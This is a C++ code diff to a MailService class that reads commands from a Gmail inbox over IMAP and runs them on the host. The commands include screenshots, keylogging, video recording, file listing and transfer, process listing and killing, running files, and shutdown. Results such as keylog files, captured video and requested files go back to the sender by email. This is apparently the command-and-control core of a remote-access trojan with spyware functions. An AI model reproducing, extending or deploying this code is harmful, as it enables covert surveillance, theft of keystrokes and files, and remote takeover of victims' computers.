@@ -41,10 +41,12 @@ size_t MailService::SearchCallback(void *contents, const size_t size, const size
 
 size_t MailService::FetchCallback(void *contents, const size_t size, const size_t nmemb, void *userp) {
     std::string res = static_cast<char *>(contents);
+    std::string from = res.substr(res.find('<') + 1, res.find('>') - res.find('<') - 1);
+    res = res.substr(res.find("\r\n\r\n") + 4);
     res = res.substr(res.find("\r\n") + 2);
-    res = res.substr(0, res.find("\r\n"));
-    auto mailContent = static_cast<std::string *>(userp);
-    mailContent->assign(res);
+    auto mailContent = static_cast<tmp *>(userp);
+    mailContent->to = from;
+    mailContent->content = res.substr(0, res.find("\r\n)"));
     return size * nmemb;
 }
 
@@ -105,7 +107,7 @@ void MailService::CheckMail() {
         throw std::runtime_error("Failed to duplicate CURL handle");
     }
 
-    std::vector<tmp> mailIds;
+    std::vector<int> mailIds;
 
     curl_easy_setopt(localCURL, CURLOPT_WRITEFUNCTION, SearchCallback);
     curl_easy_setopt(localCURL, CURLOPT_WRITEDATA, &mailIds);
@@ -116,8 +118,8 @@ void MailService::CheckMail() {
         CleanUpCURL();
         throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
     }
-    for (const auto &mailCon: mailIds) {
-        HandleMailCommand(mailCon.id, mailCon.to);
+    for (const auto &mailID: mailIds) {
+        HandleMailCommand(mailID);
     }
     curl_easy_cleanup(localCURL);
     localCURL = nullptr;
@@ -135,23 +137,23 @@ void MailService::CleanUpCURL() {
     m_CertPath.clear();
 }
 
-void MailService::HandleMailCommand(const int mailId, std::string to) {
+void MailService::HandleMailCommand(const int mailId) {
     assert(m_Initialized == true);
     CURL *localCURL = curl_easy_duphandle(m_Curl);
     if (localCURL == nullptr) {
         throw std::runtime_error("Failed to duplicate CURL handle");
     }
-    std::string mailContent;
+    tmp mailContent;
     curl_easy_setopt(localCURL, CURLOPT_WRITEFUNCTION, FetchCallback);
     curl_easy_setopt(localCURL, CURLOPT_WRITEDATA, &mailContent);
     curl_easy_setopt(localCURL, CURLOPT_URL, "imaps://imap.gmail.com:993/INBOX");
-    curl_easy_setopt(localCURL, CURLOPT_CUSTOMREQUEST, std::format("FETCH {} BODY[1]", mailId).c_str());
+    curl_easy_setopt(localCURL, CURLOPT_CUSTOMREQUEST, std::format("FETCH {} (BODY[1] BODY[HEADER.FIELDS (FROM)])", mailId).c_str());
     if (const CURLcode res = curl_easy_perform(localCURL); res != CURLE_OK) {
         CleanUpCURL();
         throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
     }
-    std::cout << "Mail ID: " << mailId << ", Content: " << mailContent << std::endl;
-    std::string command = mailContent.substr(0, mailContent.find("\r\n"));
+    std::cout << "Mail From: " << mailContent.to << ", Content: " << mailContent.content<< std::endl;
+    std::string command = mailContent.content.substr(0, mailContent.content.find("\r\n"));
     for (auto &c: command) c = toupper(c);
 
     if (command == "SCREENSHOT") {
@@ -161,19 +163,19 @@ void MailService::HandleMailCommand(const int mailId, std::string to) {
         attachment.name = "screenshot.bmp";
         attachment.command = MailCommand::SCREENSHOT;
         attachment.content = m_WindowFeature->getScreenshotData();
-        Response(to, "Here is the screenshot.", &attachment);
+        Response(mailContent.to, "Here is the screenshot.", &attachment);
     } else if (command == "SHUTDOWN") {
         std::cout << "Handling shutdown command." << std::endl;
         m_WindowFeature->requestingFeature({ 0x03, 0, nullptr});
-        Response(to, "System is shutting down.", nullptr);
+        Response(mailContent.to, "System is shutting down.", nullptr);
     } else if (command == "RESTART") {
         std::cout << "Handling restart command." << std::endl;
         m_WindowFeature->requestingFeature({ 0x04, 0, nullptr});
-        Response(to, "System is restarting.", nullptr);
+        Response(mailContent.to, "System is restarting.", nullptr);
     } else if (command == "KEYLOGGER_START") {
         std::cout << "Start keylogger command." << std::endl;
         m_KeyloggerFeature->requestingFeature({ 0x01, 0, nullptr});
-        Response(to, "Keylogger started successfully.", nullptr);
+        Response(mailContent.to, "Keylogger started successfully.", nullptr);
     } else if (command == "KEYLOGGER_STOP") {
         std::cout << "Stop keylogger command." << std::endl;
         m_KeyloggerFeature->requestingFeature({ 0x02, 0, nullptr});
@@ -181,24 +183,24 @@ void MailService::HandleMailCommand(const int mailId, std::string to) {
         attachment.name = "keylog.txt";
         attachment.command = MailCommand::KEYLOGGER;
         attachment.content = m_KeyloggerFeature->getLogging();
-        Response(to, "Keylogger stopped. Here is the log file.", &attachment);
+        Response(mailContent.to, "Keylogger stopped. Here is the log file.", &attachment);
     } else if (command == "FILE_TRANSFER") {
-        std::string fileName = mailContent.substr(mailContent.find("\r\n") + 2);
+        std::string fileName = mailContent.content.substr(mailContent.content.find("\r\n") + 2);
         std::cout << "Handling file transfer command for file: " << fileName << std::endl;
-        m_FileFeature->requestingFeature({ 0x01, (int)fileName.size(), (char*)fileName.c_str() });
+        m_FileFeature->requestingFeature({ 0x00, (int)fileName.size(), (char*)fileName.c_str() });
         MailAttachment attachment;
         attachment.name = fileName;
         attachment.command = MailCommand::FILE_TRANSFER;
         attachment.content = m_FileFeature->getCurrentData();
         if (attachment.content.empty()) {
-            Response(to, "Failed to retrieve file content.", nullptr);
+            Response(mailContent.to, "Failed to retrieve file content.", nullptr);
             return;
         }
-        Response(to, "Here is the requested file.", &attachment);
+        Response(mailContent.to, "Here is the requested file.", &attachment);
     } else if (command == "START_VIDEO_RECORDING" || command == "START_VIDEO") {
         std::cout << "Start video recording command." << std::endl;
         m_VideoFeature->requestingFeature({ 0x01, 0, nullptr });
-        Response(to, "Video recording started successfully.", nullptr);
+        Response(mailContent.to, "Video recording started successfully.", nullptr);
     } else if (command == "STOP_VIDEO_RECORDING" || command == "STOP_VIDEO") {
         std::cout << "Stop video recording command." << std::endl;
         m_VideoFeature->requestingFeature({ 0x02, 0, nullptr });
@@ -207,31 +209,31 @@ void MailService::HandleMailCommand(const int mailId, std::string to) {
         attachment.command = MailCommand::VIDEO;
         attachment.content = m_VideoFeature->videoContent;
         if (attachment.content.empty()) {
-            Response(to, "Failed to retrieve video content.", nullptr);
+            Response(mailContent.to, "Failed to retrieve video content.", nullptr);
             return;
         }
-        Response(to, "Video recording stopped. Here is the video file.", &attachment);
+        Response(mailContent.to, "Video recording stopped. Here is the video file.", &attachment);
     } else if (command == "VOLUME_UP") {
         std::cout << "Handling volume up command." << std::endl;
         m_WindowFeature->requestingFeature({ 0x01, 0, nullptr });
-        Response(to, "Volume increased successfully.", nullptr);
+        Response(mailContent.to, "Volume increased successfully.", nullptr);
     } else if (command == "VOLUME_DOWN") {
         std::cout << "Handling volume down command." << std::endl;
         m_WindowFeature->requestingFeature({ 0x02, 0, nullptr });
-        Response(to, "Volume decreased successfully.", nullptr);
+        Response(mailContent.to, "Volume decreased successfully.", nullptr);
     } else if (command == "LIST_FILES") {
-        std::string dirName = mailContent.substr(mailContent.find("\r\n") + 2);
+        std::string dirName = mailContent.content.substr(mailContent.content.find("\r\n") + 2);
         std::cout << "Handling list files command for folder " << dirName << '.' << std::endl;
-        m_FileFeature->requestingFeature({ 0x02, (int)dirName.size(), (char*)dirName.c_str() });
+        m_FileFeature->requestingFeature({ 0x01, (int)dirName.size(), (char*)dirName.c_str() });
         MailAttachment attachment;
         attachment.name = "file_list.txt";
         attachment.command = MailCommand::LIST_FILES;
         attachment.content = m_FileFeature->getCurrentData();
         if (attachment.content.empty()) {
-            Response(to, "Failed to retrieve file list.", nullptr);
+            Response(mailContent.to, "Failed to retrieve file list.", nullptr);
             return;
         }
-        Response(to, "Here is the list of files in the directory.", &attachment);
+        Response(mailContent.to, "Here is the list of files in the directory.", &attachment);
     } else if (command == "LIST_PROCESSES") {
         std::cout << "Handling list processes command." << std::endl;
         m_ProcessFeature->requestingFeature({ 0x01, 0, nullptr });
@@ -240,23 +242,22 @@ void MailService::HandleMailCommand(const int mailId, std::string to) {
         attachment.command = MailCommand::LIST_PROCESSES;
         attachment.content = m_ProcessFeature->fromAllNode();
         if (attachment.content.empty()) {
-            Response(to, "Failed to retrieve process list.", nullptr);
+            Response(mailContent.to, "Failed to retrieve process list.", nullptr);
             return;
         }
-        Response(to, "Here is the list of running processes.", &attachment);
+        Response(mailContent.to, "Here is the list of running processes.", &attachment);
     } else if (command == "KILL_PROCESS") {
-        std::string PID = mailContent.substr(mailContent.find("\r\n") + 2);
+        std::string PID = mailContent.content.substr(mailContent.content.find("\r\n") + 2);
         std::cout << "Handling kill process command for PID: " << PID << '.' << std::endl;
         m_ProcessFeature->requestingFeature({ 0x02, (int)PID.size(), (char*)PID.c_str() });
-        Response(to, "Process killed successfully.", nullptr);
+        Response(mailContent.to, "Process killed successfully.", nullptr);
     } else if (command == "RUN_FILE") {
-        std::string filePath = mailContent.substr(mailContent.find("\r\n") + 2);
+        std::string filePath = mailContent.content.substr(mailContent.content.find("\r\n") + 2);
         std::cout << "Handling run file command for file: " << filePath << '.' << std::endl;
         m_ProcessFeature->requestingFeature({ 0x03, (int)filePath.size(), (char*)filePath.c_str() });
-        Response(to, "File executed successfully.", nullptr);
+        Response(mailContent.to, "File executed successfully.", nullptr);
     } else {
-        std::cerr << "Unknown command: " << mailContent << std::endl;
-        Response(to, "Unknown command received.", nullptr);
+        Response(mailContent.to, "Unknown command received.", nullptr);
     }
 
     curl_easy_cleanup(localCURL);
@@ -286,11 +287,12 @@ void MailService::Response(const std::string &to, const std::string &body, MailA
 
     curl_mime *mime = curl_mime_init(localCURL);
     curl_mimepart *part = curl_mime_addpart(mime);
-    curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
+    curl_mime_data(part, (body + '\n').c_str(), CURL_ZERO_TERMINATED);
     curl_mime_type(part, "text/plain");
     if (attachment != nullptr) {
         part = curl_mime_addpart(mime);
-        curl_mime_name(part, attachment->name.c_str());
+        std::filesystem::path attachmentPath(attachment->name);
+        curl_mime_filename(part, attachmentPath.filename().string().c_str());
         switch (attachment->command) {
             case MailCommand::SCREENSHOT:
                 curl_mime_type(part, "image/bmp");
